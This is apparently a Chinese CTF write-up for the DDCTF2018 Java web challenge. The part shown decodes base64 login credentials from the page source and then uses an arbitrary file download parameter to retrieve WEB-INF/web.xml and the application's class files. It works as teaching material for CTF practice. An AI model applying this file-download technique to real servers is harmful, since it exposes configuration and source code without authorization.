---
title: DDCTF2018-喝杯JAVA冷静下
date: 2018-05-03 00:00:00
categories:
- CTF/Web
tags: DDCTF JavaWeb XXE OOB hashCode struts2 s2-016
---

题目链接：[http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/](http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/)

## 登录与任意文件下载

首页有提示信息：Quick4j By Eliteams，可以在github找到源码：

[https://github.com/Eliteams/quick4j](https://github.com/Eliteams/quick4j)

遇到登录框，不要上来就尝试注入什么的，先看看弱口令，或者题目有没有给用户账号等信息，本题在题目登录页面的源码中发现一串base64

```
YWRtaW46IGFkbWluX3Bhc3N3b3JkXzIzMzNfY2FpY2Fpa2Fu
```

解码为一个用户名密码：

```
admin: admin_password_2333_caicaikan
```

登录上去发现可下载informations/readme.txt这个文件，文件内容是Readme~~，没啥用，下载链接如下:

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=informations/readme.txt
```

直接尝试访问根目录下相应文件，访问成功

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/informations/readme.txt
```

猜测可以下载任意文件，尝试下载WEB-INF/web.xml成功

```
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/rest/user/getInfomation?filename=WEB-INF/web.xml
```

通过这个任意文件下载，加上github中的源码，下载能找到以下的XML以及class文件：

```
WEB-INF_classes_com_eliteams_quick4j_web_controller_CommonController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_FormController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_PageController.class
WEB-INF_classes_com_eliteams_quick4j_web_controller_UserController.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_PermissionMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_PermissionMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_dao_RoleMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_RoleMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_dao_UserMapper.class
WEB-INF_classes_com_eliteams_quick4j_web_dao_UserMapper.xml
WEB-INF_classes_com_eliteams_quick4j_web_model_Permission.class
WEB-INF_classes_com_eliteams_quick4j_web_model_PermissionExample.class
WEB-INF_classes_com_eliteams_quick4j_web_model_Role.class
WEB-INF_classes_com_eliteams_quick4j_web_model_RoleExample.class
WEB-INF_classes_com_eliteams_quick4j_web_model_User.class
WEB-INF_classes_com_eliteams_quick4j_web_model_UserExample.class
WEB-INF_classes_com_eliteams_quick4j_web_security_OperationType.class
WEB-INF_classes_com_eliteams_quick4j_web_security_PermissionSign.class
WEB-INF_classes_com_eliteams_quick4j_web_security_Resource.class
WEB-INF_classes_com_eliteams_quick4j_web_security_RoleSign.class
WEB-INF_classes_com_eliteams_quick4j_web_security_SecurityRealm.class
WEB-INF_classes_com_eliteams_quick4j_web_service_PermissionService.class
WEB-INF_classes_com_eliteams_quick4j_web_service_RoleService.class
WEB-INF_classes_com_eliteams_quick4j_web_service_UserService.class
WEB-INF_web.xml
```
